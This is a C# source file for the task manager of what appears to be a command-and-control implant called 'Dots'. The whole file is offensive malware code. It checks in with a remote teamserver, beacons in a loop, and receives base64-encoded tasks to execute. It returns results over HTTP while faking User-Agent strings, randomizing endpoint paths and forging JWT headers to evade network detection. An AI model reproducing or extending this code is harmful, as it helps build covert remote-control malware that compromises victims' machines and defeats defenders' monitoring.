using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json.Serialization;
using System.Threading.Tasks;
using System.Text.Json;
using System.Collections.Concurrent;
using System.Threading;
using Dots.Models;

namespace Dots
{
    public class TaskManager
    {
        public string TeamServerUri { get; set; }

        private ConcurrentQueue<TaskRequest> _batchRequest = new ConcurrentQueue<TaskRequest>();
        private ConcurrentQueue<TaskResult> _batchResults = new ConcurrentQueue<TaskResult>();
        private ConcurrentQueue<TaskError> _batchErrors = new ConcurrentQueue<TaskError>();
        private TaskResult _checkInTask {get; set; }
        private readonly HttpClient _client = new HttpClient();
        private CancellationTokenSource _tokenSource;

        // Why does the agent not reconnect after I close the teamserver?
        // Is there a better way to do SendTask/SendError with iEnumerable<DotsTask>
        // /yyyyyyyyyy endpoint?
        // Move generate methods to Implant Check In process
        // Individual Projects for Commands / Modules

        public TaskManager(string teamServerUri) 
        {
            TeamServerUri = teamServerUri;
        }

        public void Init()
        {
            _client.BaseAddress = new Uri(TeamServerUri);
            _client.DefaultRequestHeaders.Clear();
            _client.DefaultRequestHeaders.Add("User-Agent", GenerateRandomUserAgent());
            _client.DefaultRequestHeaders.Add("Accept", "application/json");
            _client.DefaultRequestHeaders.Add("Authorization", $"JWT {GenerateAuthorizationToken()}");
        }

        public async Task InitialCheckin(string key)
        {
            TaskResult initialCheckinTask = new TaskResult
            {
                JSONRPC = "2.0",
                Result = "",
                Id = key
            };
            string json = JsonSerializer.Serialize(initialCheckinTask);
            HttpResponseMessage response = await _client.PostAsync(GenerateEndpoint(), new StringContent(json, Encoding.UTF8, "application/json"));
            if (response.IsSuccessStatusCode)
            {
                TaskRequest checkInTaskRequest = JsonSerializer.Deserialize<TaskRequest>(await response.Content.ReadAsStringAsync());
                _checkInTask = new TaskResult
                {
                    JSONRPC = checkInTaskRequest.JSONRPC,
                    Result = "",
                    Id = checkInTaskRequest.Id
                };

            }
            else
            {
                Environment.Exit(0);
            }
        }

        public async Task Start()
        {
            _tokenSource = new CancellationTokenSource();
            while (!_tokenSource.IsCancellationRequested)
            {
                if (_checkInTask !=  null) {
                    _batchResults.Enqueue(_checkInTask);
                } else
                {
                    continue;
                }
                IEnumerable<DotsTask> batchResult = RetrieveBatchResults();
                IEnumerable<DotsTask> batchErrors = RetrieveBatchErrors();

                // Combine response and errors into a single list
                List<object> batchResponse = new List<object>();
                batchResponse.AddRange(batchResult);
                batchResponse.AddRange(batchErrors);
                string json = JsonSerializer.Serialize(batchResponse);

                HttpResponseMessage response = await _client.PostAsync(GenerateEndpoint(), new StringContent(json, Encoding.UTF8, "application/json"));
                TaskRequest[] tasks = null;
                if (response.IsSuccessStatusCode)
                {
                    try
                    {
                        string responseBody = await response.Content.ReadAsStringAsync();
                        tasks = JsonSerializer.Deserialize<TaskRequest[]>(responseBody);
                    } catch (Exception ex) 
                    {
                        TaskError failedToParseError = new TaskError
                        {
                            JSONRPC = "2.0",
                            ErrorDetails = new TaskErrorDetails
                            {
                                Code = -32700,
                                Message = Convert.ToBase64String(Encoding.UTF8.GetBytes(ex.Message)),
                            },
                            Id = null
                        };
                        _batchErrors.Enqueue(failedToParseError);
                    }
                }
                if (tasks != null && tasks.Any()) {
                    foreach (var task in tasks)
                    {
                        for (int i = 0; i < task.Params.Length; i++)
                        {
                            task.Params[i] = Base64Decode(task.Params[i]);
                        }

                        _batchRequest.Enqueue(task);
                    }
                }
            }
        }

        public void Stop()
        {
            _tokenSource.Cancel();
        }

        public bool RetrieveBatchRequest(out IEnumerable<TaskRequest> tasks)
        {
            if (_batchRequest.IsEmpty)
            {
                tasks = null; 
                return false;
            }

            var list = new List<TaskRequest>();
            while (_batchRequest.TryDequeue(out var task))
            {
                list.Add(task);
            }
            tasks = list;
            return true;
        }

        private IEnumerable<TaskResult> RetrieveBatchResults()
        {
            var tasks = new List<TaskResult>();
            while (_batchResults.TryDequeue(out var task))
            {
                tasks.Add(task);
            }
            return tasks;
        }
        private IEnumerable<TaskError> RetrieveBatchErrors()
        {
            var tasks = new List<TaskError>();
            while (_batchErrors.TryDequeue(out var task))
            {
                tasks.Add(task);
            }
            return tasks;
        }

        public void SendResult(TaskResult task)
        {
            _batchResults.Enqueue(task);
        }

        public void SendError(TaskError task)
        {
            _batchErrors.Enqueue(task);
        }

        private static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }

        private static string GenerateRandomUserAgent()
        {
            // List of operating systems
            string[] osList = {
                "Windows NT 10.0",
                "Windows NT 6.3; Win64; x64",
                "Windows NT 6.3; WOW64",
                "Windows NT 6.2; Win64; x64",
                "Windows NT 6.2; WOW64",
                "Windows NT 6.1",
                "Windows NT 6.1; WOW64",
                "Windows NT 6.0",
                "Windows NT 6.0; WOW64",
                "Windows NT 5.1",
                "Windows NT 5.1; WOW64",
                "Macintosh; Intel Mac OS X 10_15_7",
                "Macintosh; Intel Mac OS X 10_14_6",
                "Linux x86_64",
                "Linux i686",
                "FreeBSD i386",
                "FreeBSD amd64",
                "OpenBSD i386",
                "OpenBSD amd64",
                "NetBSD i386",
                "NetBSD amd64"
            };

            // List of web browsers
            string[] browserList = {
                "Chrome/90.0.4430.212",
                "Firefox/88.0",
                "Safari/537.36",
                "Edge/90.0.818.56",
                "Opera/76.0.4017.123",
                "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
            };

            // List of screen resolutions
            string[] screenResolutionList = {
                "1920x1080",
                "1366x768",
                "1280x800",
                "1440x900",
                "1680x1050",
                "2560x1440"
            };

            // List of supported languages
            string[] languageList = {
                "en-US",
                "en-GB",
                "fr-FR",
                "de-DE",
                "es-ES",
                "pt-PT",
                "pt-BR",
                "it-IT",
                "ru-RU",
                "ja-JP",
                "ko-KR",
                "zh-CN",
                "zh-TW"
            };

            // Select random values for the variables
            string os = osList[new Random().Next(osList.Length)];
            string browser = browserList[new Random().Next(browserList.Length)];
            string screenResolution = screenResolutionList[new Random().Next(screenResolutionList.Length)];
            string language = languageList[new Random().Next(languageList.Length)];

            // Construct the user agent string
            return $"Mozilla/5.0 ({os}; {screenResolution}) AppleWebKit/537.36 (KHTML, like Gecko) {browser} Safari/537.36 {language}";
        }

        private string GenerateEndpoint()
        {
            string[] words = {
                "lorem",
                "ipsum",
                "dolor",
                "sit",
                "amet",
                "consectetur",
                "adipiscing",
                "elit",
                "sed",
                "do",
                "eiusmod",
                "tempor",
                "incididunt",
                "ut",
                "labore",
                "et",
                "dolore",
                "magna",
                "aliqua"
            };

            string[] parameters = {
                "user",
                "id",
                "name",
                "value",
                "category",
                "type",
                "action",
                "status",
                "option",
                "mode"
            };

            // Generate a random length for the endpoint
            int length = new Random().Next(5, 16);

            // Generate a random endpoint by selecting random characters from the alphabet
            var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            var endpointChars = Enumerable.Range(0, length).Select(x => chars[new Random().Next(chars.Length)]);
            string endpoint = new string(endpointChars.ToArray());

            // Randomly add query string parameters
            if (new Random().Next(2) == 1)
            {
                int numParams = new Random().Next(1, 4);
                for (int i = 0; i < numParams; i++)
                {
                    string parameterKey = parameters[new Random().Next(parameters.Length)];
                    string parameterValue = words[new Random().Next(words.Length)];
                    string queryParameter = $"{parameterKey}={parameterValue}";
                    if (i == 0)
                    {
                        endpoint += "?" + queryParameter;
                    }
                    else
                    {
                        endpoint += "&" + queryParameter;
                    }
                }
            }

            return endpoint;
        }

        private string GenerateAuthorizationToken()
        {
            // Generate a random word of length 5-15 using uppercase and lowercase letters
            Random random = new Random();
            int length = random.Next(5, 16);
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            string word = new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());

            // Base64-encode the random word for each component of the JWT token
            string[] authOptions = {
                Convert.ToBase64String(Encoding.UTF8.GetBytes("{" + $"alg:{word},typ:JWT" + "}")), // Base64-encoded header
                Convert.ToBase64String(Encoding.UTF8.GetBytes("{" + $"sub:{word},name:John Doe,iat:{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}" + "}")), // Base64-encoded payload
                Convert.ToBase64String(Encoding.UTF8.GetBytes(word)) // Base64-encoded secret key
            };

            // Concatenate the header, payload, and secret key with "." separators
            string token = String.Join(".", authOptions);

            return token;
        }
    }
}
